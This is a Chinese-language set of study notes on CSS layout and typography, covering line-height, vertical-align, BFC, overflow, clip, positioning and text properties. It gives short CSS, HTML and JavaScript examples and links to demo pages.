<h2 id="_18-基于-ex-单位的天然垂直居中对齐-demo"> 18. 基于 ex 单位的天然垂直居中对齐（<a href="https://demo.cssworld.cn/5/1-1.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span>.icon-arrow</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>width</span><span>:</span> 20px<span>;</span>
  <span>height</span><span>:</span> 1ex<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>arrow.png<span>)</span></span> no-repeat center<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_19-内联元素的高度之本-line-height"> 19. 内联元素的高度之本 — line-height</h2>
<ul>
<li>
<p>默认空<code>&lt;div&gt;</code>高度是由行高决定的，而非文字（<a href="https://demo.cssworld.cn/5/2-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>line-height 不可以影响替换元素（如图片的高度）。</p>
<blockquote>
<p>不是 line-height 把图片占据高度变高了，而是把 “幽灵空白节点” 的高度变高了。</p>
</blockquote>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>1.jpg<span>"</span></span> <span>height</span><span><span>=</span><span>"</span>128<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>.box</span> <span>{</span>
  <span>line-height</span><span>:</span> 256px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_20-行高与多行文字垂直居中-demo"> 20. 行高与多行文字垂直居中（<a href="https://demo.cssworld.cn/5/2-4.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>content<span>"</span></span><span>></span></span>基于行高实现的...<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>.box</span> <span>{</span>
  <span>line-height</span><span>:</span> 120px<span>;</span>
  <span>background-color</span><span>:</span> #f0f3f9<span>;</span>
<span>}</span>
<span>.content</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>line-height</span><span>:</span> 20px<span>;</span>
  <span>margin</span><span>:</span> 0 20px<span>;</span>
  <span>vertical-align</span><span>:</span> middle<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_21-深入-line-height-的各类属性值"> 21. 深入 line-height 的各类属性值</h2>
<ul>
<li>
<p>数值、百分比值、长度值差异（<a href="http://demo.cssworld.cn/5/2-5.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ul>
<li>line-height:150%和 line-height:1.5em 代码下的文字重叠的原因在于<code>&lt;h3&gt;</code>和<code>&lt;p&gt;</code>元素继承的并不是 150%或者 1.5em，而是<code>&lt;body&gt;</code>元素的 line-height 计算值 21px，也就是说，<code>&lt;h3&gt;</code>和<code>&lt;p&gt;</code>元素的行高都是 21px，考虑到<code>&lt;h3&gt;</code>的 font-size 大小为 32px，此时<code>&lt;h3&gt;</code>的半行间距就是-5.5px，因而“标题”文字和下面的“内容”文字发生重叠。</li>
<li>但是 line-height:1.5 的继承则不同，<code>&lt;h3&gt;</code>和<code>&lt;p&gt;</code>元素的 line-height 继承的不是计算值，而是属性值 1.5，因此，对于<code>&lt;h3&gt;</code>元素，此时的行高计算值是 1.5<em>32px=48px，<code>&lt;p&gt;</code>元素的行高计算值是 1.5</em>20px=30px，于是，间距合理，排版舒适。</li>
</ul>
</blockquote>
</li>
<li>
<p>注意，在 CSS 中，计算行高的时候，行高值一定不要向下舍入，而要向上舍入。上面虽然 14*1.42857 计算机近乎是 20px，但在 Chrome 浏览器下，依然以 19px 的高度呈现，如果我们向上舍入取 1.42858，则最终所有浏览器行高计算值是 20px。</p>
</li>
</ul>
<h2 id="_22-内联元素-line-height-的-大值特性"> 22. 内联元素 line-height 的“大值特性”</h2>
<ul>
<li>
<p>假如文字就 1 行，.box 元素的高度分别是多少？</p>
<blockquote>
<p>无论内联元素 line-height 如何设置，最终父级元素的高度都是由数值大的那个 line-height 决定的，我称之为 “内联元素 line-height 的大值特性”（原因：幽灵空白节点）。</p>
</blockquote>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>span</span><span>></span></span>内容...<span><span><span>&lt;/</span>span</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>/* 示例一 */</span>
<span>.box</span> <span>{</span>
  <span>line-height</span><span>:</span> 96px<span>;</span>
<span>}</span>
<span>.box span</span> <span>{</span>
  <span>line-height</span><span>:</span> 20px<span>;</span>
<span>}</span>

<span>/* 示例二 */</span>
<span>.box</span> <span>{</span>
  <span>line-height</span><span>:</span> 20px<span>;</span>
<span>}</span>
<span>.box span</span> <span>{</span>
  <span>line-height</span><span>:</span> 96px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></li>
</ul>
<h2 id="_23-vertical-align-家族基本认识"> 23. vertical-align 家族基本认识</h2>
<ul>
<li>
<p>使用 vertical-align 数值实现文字和小图标对齐（<a href="https://demo.cssworld.cn/5/3-3.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ul>
<li>由于 middle 并不是真正意义上的垂直居中，因此还是会有像素级别的误差，误差大小与字体和字号均有关。</li>
<li>设置 vertical-align: -5px，此时，图标和文字实现了真正意义上的垂直居中，此时容器的可视高度和当前行高 20 像素保持了一致。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_24-vertical-align-作用的前提"> 24. vertical-align 作用的前提</h2>
<ul>
<li>
<p>前提条件：只能应用于内联元素以及 display 值为 table-cell 的元素。</p>
</li>
<li>
<p>这种情况看上去是 vertical-align: middle 没起作用，实际上，vertical-align 是在努力地渲染的，只是行框盒子前面的 “幽灵空白节点” 高度太小，如果我们通过设置一个足够大的行高让 “幽灵空白节点” 高度足够，就会看到 vertical-align: middle 起作用了。</p>
</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>1.jpg<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>/* 看上去不起作用 */</span>
<span>.box</span> <span>{</span>
  <span>height</span><span>:</span> 128px<span>;</span>
<span>}</span>
<span>.box > img</span> <span>{</span>
  <span>height</span><span>:</span> 96px<span>;</span>
  <span>vertical-align</span><span>:</span> middle<span>;</span>
<span>}</span>

<span>/* 添加line-height */</span>
<span>.box</span> <span>{</span>
  <span>height</span><span>:</span> 128px<span>;</span>
  <span>line-height</span><span>:</span> 128px<span>;</span> <span>/* 关键 CSS 属性 */</span>
<span>}</span>
<span>.box > img</span> <span>{</span>
  <span>height</span><span>:</span> 96px<span>;</span>
  <span>vertical-align</span><span>:</span> middle<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><ul>
<li>table-cell 元素设置 vertical-align 垂直对齐的是子元素，但是其作用的并不是子元素，而是 table-cell 元素自身（<a href="https://demo.cssworld.cn/5/3-4.php" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<h2 id="_25-vertical-align-和-line-height-之间的关系"> 25. vertical-align 和 line-height 之间的关系</h2>
<ul>
<li>
<p>图片底部留有间隙的问题（<a href="https://demo.cssworld.cn/5/3-5.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ol>
<li>图片块状化。</li>
<li>容器 line-height 足够小。</li>
<li>容器 font-size 足够小。</li>
<li>图片设置其他 vertical-align 属性值。</li>
</ol>
</blockquote>
</li>
<li>
<p>两端对齐列表的间隙问题（<a href="https://demo.cssworld.cn/5/3-6.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>利用 inline-block 基线原理的小图标对齐（<a href="https://demo.cssworld.cn/5/3-7.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
</ul>
<h2 id="_26-vertical-align-middle-与近似垂直居中-demo"> 26. vertical-align:middle 与近似垂直居中（<a href="https://demo.cssworld.cn/5/3-8.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>
<p>line-height 和 vertical-align: middle 实现的多行文本或者图片的垂直居中全部都是 “近似垂直居中”，原因与 vertical- align: middle 的定义有关。</p>
<blockquote>
<ul>
<li>内联元素：元素的垂直中心点和行框盒子基线往上 1/2 x-height 处对齐。</li>
<li>table-cell 元素：单元格填充盒子相对于外面的表格行居中对齐。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_27-成事不足败事有余的-clear"> 27. 成事不足败事有余的 clear</h2>
<ul>
<li>
<p>clear 属性只有块级元素才有效的，而::after 等伪元素默认都是内联水平，这就是借助伪元素清除浮动影响时需要设置 display 属性值的原因。</p>
</li>
<li>
<p>由于 clear:both 的作用本质是让自己不和 float 元素在一行显示，并不是真正意义上的清除浮动，因此 float 元素一些不好的特性依然存在，于是，会有类似下面的现象。</p>
<blockquote>
<ul>
<li>如果 clear:both 元素前面的元素就是 float 元素，则 margin-top 负值即使设成-9999px，也不见任何效果。</li>
<li>clear:both 后面的元素依旧可能会发生文字环绕的现象。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_28-bfc-的定义"> 28. BFC 的定义</h2>
<ul>
<li>
<p>那什么时候会触发 BFC 呢？常见的情况如下。</p>
<blockquote>
<ul>
<li><code>&lt;html&gt;</code>根元素。</li>
<li>float 的值不为 none。</li>
<li>overflow 的值为 auto、scroll 或 hidden。</li>
<li>display 的值为 table-cell、table-caption 和 inline-block 中的任何一个。</li>
<li>position 的值不为 relative 和 static。</li>
</ul>
</blockquote>
</li>
<li>
<p>换言之，只要元素符合上面任意一个条件，就无须使用 clear:both 属性去清除浮动的影响了。因此，不要见到一个<code>&lt;div&gt;</code>元素就加个类似.clearfix 的类名，否则只能暴露你孱弱的 CSS 基本功。</p>
</li>
</ul>
<h2 id="_29-最佳结界-overflow"> 29. 最佳结界 overflow</h2>
<ul>
<li>要想彻底清除浮动的影响，最适合的属性不是 clear 而是 overflow。</li>
</ul>
<h2 id="_30-overflow-与滚动条"> 30. overflow 与滚动条</h2>
<ul>
<li>
<p>关于浏览器的滚动条，有以下几个小而美的结论。</p>
<blockquote>
<ul>
<li>在 PC 端，无论是什么浏览器，默认滚动条均来自<code>&lt;html&gt;</code>，而不是<code>&lt;body&gt;</code>标签。</li>
<li>滚动条会占用容器的可用宽度或高度。</li>
</ul>
</blockquote>
<div><pre><code><span>html</span> <span>{</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
&lt;!-- 去除页面默认滚动条，没必要把&lt;body>也拉下水 -->
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<p>让页面滚动条不发生晃动的小技巧。</p>
</li>
</ul>
<div><pre><code><span>html</span> <span>{</span>
  <span>overflow-y</span><span>:</span> scroll<span>;</span> <span>/* for IE8 */</span>
<span>}</span>
<span>:root</span> <span>{</span>
  <span>overflow-y</span><span>:</span> auto<span>;</span>
  <span>overflow-x</span><span>:</span> hidden<span>;</span>
<span>}</span>
<span>:root body</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
<span>}</span>
<span>body</span> <span>{</span>
  <span>width</span><span>:</span> 100vw<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><ul>
<li>
<p>滚动条是可以自定义的。因为 IE 浏览器的自定义效果实在是比原生的还要难看，就不浪费大家时间了，就此打住。倒是支持-webkit-前缀的浏览器可以说说。</p>
<blockquote>
<ul>
<li>整体部分，::-webkit-scrollbar。</li>
<li>两端按钮，::-webkit-scrollbar-button。</li>
<li>外层轨道，::-webkit-scrollbar-track。</li>
<li>内层轨道，::-webkit-scrollbar-track-piece。</li>
<li>滚动滑块，::-webkit-scrollbar-thumb。</li>
<li>边角，::-webkit-scrollbar-corner。</li>
<li>但是我们平时开发中只用下面 3 个属性。</li>
</ul>
</blockquote>
<div><pre><code><span>::-webkit-scrollbar</span> <span>{</span>
  <span>/* 血槽宽度 */</span>
  <span>width</span><span>:</span> 8px<span>;</span>
  <span>height</span><span>:</span> 8px<span>;</span>
<span>}</span>
<span>::-webkit-scrollbar-thumb</span> <span>{</span>
  <span>/* 拖动条 */</span>
  <span>background-color</span><span>:</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.3<span>)</span><span>;</span>
  <span>border-radius</span><span>:</span> 6px<span>;</span>
<span>}</span>
<span>::-webkit-scrollbar-track</span> <span>{</span>
  <span>/* 背景槽 */</span>
  <span>background-color</span><span>:</span> #ddd<span>;</span>
  <span>border-radius</span><span>:</span> 6px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></li>
</ul>
<h2 id="_31-overflow-与锚点定位"> 31. overflow 与锚点定位</h2>
<ul>
<li>
<p>元素设置了 overflow:hidden 声明，里面内容高度溢出的时候，滚动依然存在，仅仅滚动条不存在。</p>
</li>
<li>
<p>URL 锚链锚点定位和 overflow 的选项卡切换（<a href="https://demo.cssworld.cn/6/4-2.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
<blockquote>
<ul>
<li>其一，容器高度需要固定。</li>
<li>其二，也是最麻烦的，就是 “由内而外” 的锚点定位会触发窗体的重定位，也就是说，如果页面也是可以滚动的，则点击选项卡按钮后页面会发生跳动，这种体验显然是非常不好的。</li>
</ul>
</blockquote>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>list<span>"</span></span> <span>id</span><span><span>=</span><span>"</span>one<span>"</span></span><span>></span></span>1<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>list<span>"</span></span> <span>id</span><span><span>=</span><span>"</span>two<span>"</span></span><span>></span></span>2<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>list<span>"</span></span> <span>id</span><span><span>=</span><span>"</span>three<span>"</span></span><span>></span></span>3<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>list<span>"</span></span> <span>id</span><span><span>=</span><span>"</span>four<span>"</span></span><span>></span></span>4<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>link<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>#one<span>"</span></span><span>></span></span>1<span><span><span>&lt;/</span>a</span><span>></span></span>
  <span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>#two<span>"</span></span><span>></span></span>2<span><span><span>&lt;/</span>a</span><span>></span></span>
  <span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>#three<span>"</span></span><span>></span></span>3<span><span><span>&lt;/</span>a</span><span>></span></span>
  <span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span>#four<span>"</span></span><span>></span></span>4<span><span><span>&lt;/</span>a</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>.box</span> <span>{</span>
  <span>height</span><span>:</span> 10em<span>;</span>
  <span>border</span><span>:</span> 1px solid #ddd<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
<span>.list</span> <span>{</span>
  <span>line-height</span><span>:</span> 10em<span>;</span>
  <span>background</span><span>:</span> #ddd<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>focus 锚点定位和 overflow 的选项卡切换优化（<a href="https://demo.cssworld.cn/6/4-3.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
</ul>
<h2 id="_32-具有相对特性的无依赖-absolute-绝对定位"> 32. 具有相对特性的无依赖 absolute 绝对定位</h2>
<ul>
<li>
<p>一个 absolute 就能实现定位（<a href="https://demo.cssworld.cn/6/5-4.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>“无依赖绝对定位” 与导航图标定位（<a href="https://demo.cssworld.cn/6/5-5.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>“无依赖绝对定位”与超越常规布局的排版（<a href="https://demo.cssworld.cn/6/5-6.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>“无依赖绝对定位”与下拉列表定位（<a href="https://demo.cssworld.cn/6/5-7.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
</ul>
<h2 id="_33-absolute-与-clip"> 33. absolute 与 clip</h2>
<ul>
<li>clip 属性要想起作用，元素必须是绝对定位或者固定定位，也就是 position 属性值必须是 absolute 或者 fixed（不能缩写、不支持百分比值）。</li>
</ul>
<h2 id="_34-重新认识的-clip-属性"> 34. 重新认识的 clip 属性</h2>
<ul>
<li>
<p>如何隐藏<code>&lt;h1&gt;</code>标签中的 “CSS 世界” 这几个文字，通常有以下一些技术选型。</p>
<blockquote>
<ol>
<li>下策是 display:none 或者 visibility:hidden 隐藏，因为屏幕阅读设备会忽略这里的文字。</li>
<li>text-indent 缩进是中策，但文字如果缩进过大，大到屏幕之外，屏幕阅读设备也是不会读取的。</li>
<li>color:transparent 是移动端上策，但却是桌面端中策，因为原生 IE8 浏览器并不支持它。color:transparent 声明，很难用简单的方式阻止文本被框选。</li>
<li>clip 剪裁隐藏是上策，既满足视觉上的隐藏，屏幕阅读设备等辅助设备也支持得很好。</li>
</ol>
</blockquote>
<div><pre><code><span>.logo h1</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>clip</span><span>:</span> <span>rect</span><span>(</span>0 0 0 0<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
</ul>
<h2 id="_35-relative-与定位"> 35. relative 与定位</h2>
<ul>
<li>
<p>relative 的定位还有另外两点值得一提：相对定位元素的 left/top/right/bottom 的百分比值是相对于包含块计算的，而不是自身。注意，虽然定位位移是相对自身，但是百分比值的计算值不是。</p>
</li>
<li>
<p>top 和 bottom 这两个垂直方向的百分比值计算跟 height 的百分比值是一样的，都是相对高度计算的。同时，如果包含块的高度是 auto，那么计算值是 0，偏移无效也就是说，如果父元素没有设定高度或者不是 “格式化高度”，那么 relative 类似 top: 20%的代码等同于 top: 0。</p>
</li>
</ul>
<h2 id="_36-position-fixed-与背景锁定"> 36. position:fixed 与背景锁定</h2>
<ul>
<li>
<p>蒙层弹窗：消失的滚动条使用同等宽度的透明边框填充。</p>
<blockquote>
<p>蒙层显示的同时执行下面的 JavaScript 代码。</p>
</blockquote>
<div><pre><code><span>var</span> widthBar <span>=</span> <span>17</span><span>,</span>
  root <span>=</span> document<span>.</span>documentElement
<span>if</span> <span>(</span><span>typeof</span> window<span>.</span>innerWidth <span>==</span> <span>'number'</span><span>)</span> <span>{</span>
  widthBar <span>=</span> window<span>.</span>innerWidth <span>-</span> root<span>.</span>clientWidth
<span>}</span>
root<span>.</span>style<span>.</span>overflow <span>=</span> <span>'hidden'</span>
root<span>.</span>style<span>.</span>borderRight <span>=</span> widthBar <span>+</span> <span>'px solid transparent'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><blockquote>
<p>蒙层隐藏的时候执行下面的 JavaScript 代码。</p>
</blockquote>
<div><pre><code><span>var</span> root <span>=</span> document<span>.</span>documentElement
root<span>.</span>style<span>.</span>overflow <span>=</span> <span>''</span>
root<span>.</span>style<span>.</span>borderRight <span>=</span> <span>''</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_37-了解衬线字体和无衬线字体"> 37. 了解衬线字体和无衬线字体</h2>
<ul>
<li>需要注意的是，serif 和 sans-serif 一定要写在最后，因为在大多数浏览器下，写在 serif 和 sans-serif 后面的所有字体都会被忽略。</li>
</ul>
<div><pre><code><span>body</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>'Microsoft Yahei'</span><span>,</span> sans-serif<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_38-font-关键字属性值的应用价值"> 38. font 关键字属性值的应用价值</h2>
<ul>
<li>让网页的字体跟系统走。</li>
</ul>
<div><pre><code><span>html</span> <span>{</span>
  <span>font</span><span>:</span> menu<span>;</span>
<span>}</span>
<span>body</span> <span>{</span>
  <span>font-size</span><span>:</span> 16px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_39-font-face-的本质是变量"> 39. @font face 的本质是变量</h2>
<ul>
<li>借助 font-weight 实现响应式图标（<a href="https://demo.cssworld.cn/8/5-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<h2 id="_40-text-indent-与内联元素缩进"> 40. text-indent 与内联元素缩进</h2>
<ul>
<li>
<p>text-indent 的百分比值是相对于当前元素的 “包含块” 计算的，而不是当前元素（<a href="http://demo.cssworld.cn/8/6-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>text-align 与纯文本对齐。</p>
</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span>
  面子：请给我一个面子,做我儿子吧！
<span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;</span>p</span><span>></span></span>
  剑来：大雨依旧磅礴。她不起身，徐凤年便一直撑着伞。老剑神李淳罡望向这一幕，瞪大眼睛。随即眼中黯然落寞缅怀追忆皆有。那一年背负那女子上斩魔台，一样是大雨天气，一样是撑伞。世人不知这位剑神当年被齐玄帧所误，木马牛被折并不算什么，只剩独臂也不算什么，这都不是李淳罡境界大跌的根由，潮亭下被困二十年，李淳罡也不曾走出那个自己的画地为牢。原本与世已是无敌，与己又当如何？李淳罡想起她临终时的容颜，当时她已说不出一个字，可今曰想来，不就是那不悔两字吗？！李淳罡走到大雪坪崖畔，身后是一如他与绿袍女子场景的撑伞男女。她被一剑洞穿心胸时，曾惨白笑言：“天不生你李淳罡，很无趣呢。”李淳罡大声道：“剑来！”徽山所有剑士的数百佩剑一齐出鞘，向大雪坪飞来。龙虎山道士各式千柄桃木剑一概出鞘，浩浩荡荡飞向牯牛大岗。两拨飞剑。遮天蔽曰。这一曰，剑神李淳罡再入陆地剑仙境界。
<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><div><pre><code><span>p</span> <span>{</span>
  <span>text-indent</span><span>:</span> -3em<span>;</span>
  <span>padding-left</span><span>:</span> 3em<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_41-letter-spacing-与字符间距"> 41. letter-spacing 与字符间距</h2>
<ul>
<li>非 IE 浏览器反向排列。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>p</span> <span>class</span><span><span>=</span><span>"</span>lt<span>"</span></span><span>></span></span>一二三四五<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>.lt</span> <span>{</span>
  <span>letter-spacing</span><span>:</span> -2em<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>letter-spacing 与字符动效（<a href="https://demo.cssworld.cn/8/6-4.php" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>.title</span> <span>{</span>
  <span>animation</span><span>:</span> text-in 1s both<span>;</span>
<span>}</span>
<span><span>@keyframes</span> text-in</span> <span>{</span>
  <span>0%</span> <span>{</span>
    <span>letter-spacing</span><span>:</span> -200px<span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>letter-spacing</span><span>:</span> 0<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_42-word-spacing-与单词间距"> 42. word-spacing 与单词间距</h2>
<ul>
<li>
<p>word-spacing 仅作用于空格字符。可以是 Space 键敲出来的空格（U+0020），也可以是换行符产生的空格（浏览器解析为 U+0020），还可以是 Tab 键敲出来的空格（U+0009），抑或是&amp;npsp;非换行空格（U+00A0）。</p>
</li>
<li>
<p>小程序 text-align: justify 不管用时可以试试这个。</p>
</li>
</ul>
<h2 id="_43-了解-word-break-和-word-wrap-的区别-demo"> 43. 了解 word-break 和 word-wrap 的区别（<a href="https://demo.cssworld.cn/8/6-5.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>顾名思义，word-break: break-all 的作用是所有的都换行，毫不留情，一点儿空隙都不放过，而 word-wrap: break-word 则带有怜悯之心，如果这一行文字有可以换行的点，如空格或 CJK（中文/日文/韩文）之类的，就不打英文单词或字符的主意了，在这些换行点换行，至于对不对齐、好不好看则不关心，因此，很容易出现一片一片空白区域的情况。</li>
</ul>
<h2 id="_44-一本万利的-text-transform-字符大小写-demo"> 44. 一本万利的 text-transform 字符大小写（<a href="http://demo.cssworld.cn/8/6-9.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>使用场景：身份证输入、验证码输入。</li>
</ul>
<div><pre><code><span>input</span> <span>{</span>
  <span>text-transform</span><span>:</span> uppercase<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_45-深入-first-letter-伪元素及其实例"> 45. 深入:first-letter 伪元素及其实例</h2>
<ul>
<li>
<p>::first-letter 伪元素生效的前提：首先，元素的 display 计算值必须是 block、inline-block、list-item、table-cell 或者 table-caption，其他所有 display 计算值都没有用，包括 display: table 和 display: flex 等。此外，不是所有的字符都能单独作为::first-letter 伪元素存在的，赠品字符不支持（“赠品字符”包括·@#%&amp;<em>()（）[]【】{}:：&quot;“”;。'‘’》《,，.。？?!！…</em>、/\）。</p>
</li>
<li>
<p>::first-letter 颜色等权重总是多了一层：“第”这个字符的颜色超过 95% 的前端人员会认为是 blue，因为大家都是从 CSS 选择器权重的角度去考虑的。这个答案本身没问题，但是却忽略了很重要的一点，::first-letter 伪元素其实是作为子元素存在的，或者说应当看出是子元素，于是就很好理解了。对于类似 color 这样的继承属性，子元素的 CSS 设置一定比父元素的级别要高，哪怕父级使用了重量级的!important，因为子元素会先继承，然后再应用自身设置。因此，上面 CSS 和 HTML 代码的最终结果是，第一个字符 “第” 字的颜色是 red，红色。</p>
</li>
</ul>
